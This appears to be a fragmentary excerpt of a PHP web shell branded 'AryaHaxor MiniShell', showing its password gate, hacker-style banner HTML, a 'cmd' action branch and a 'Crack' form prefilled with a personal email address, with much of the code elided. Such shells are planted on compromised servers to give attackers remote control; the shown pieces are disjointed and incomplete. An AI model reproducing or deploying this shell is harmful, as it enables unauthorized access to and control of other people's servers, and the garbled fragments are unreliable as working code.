...
if($_POST['password'] == $pass) {
  ...
  echo "<script>window.location='?KUBIL-TZY'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
...
<html>
<head>
	<title>WELCOME TOD</title>
</head>
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<body bgcolor="black">
	<center><img src="https://k.top4top.io/p_2385d15r05.png" style="opacity:0.5; width:300px; height:300px";></center>
	<center><h1><center><font color="red" face="Patrick Hand">-=[ AryaHaxor</font><font color="white" face="Patrick Hand"> Shell ]=-</font><br>
</center>
...
<HTML>
<HEAD>
<link rel="SHORTCUT ICON" href="https://k.top4top.io/p_2385d15r05.png">
<DIV align=center><IMG src="https://k.top4top.io/p_2385d15r05.png" width=500 height=300><br>
...
<title>AryaHaxor MiniShell</title>
...
echo '<font color="red"> Gagal Mek </font><br/>';
}
}
...
if($_GET['do'] == 'cmd') {
	...
	<center>
	<form action="#" method="post"> 	 <input type="email" name="email" style=color:lime;background-color:#191919;font-family:kelly slab;  value="steven260902@gmail.com" /> 	 <input type="submit" name="submit" style=color:lime;background-color:#191919;font-family:kelly slab;  value="Crack"/></center>
	</form> 	 	 
	<br/>
...
echo '<font face="Kelly Slab" color="white" size="2px"><center><br/><b>Copyright &copy; 2K20 <font color="lime">KUB1L-TZY</a></center></font>
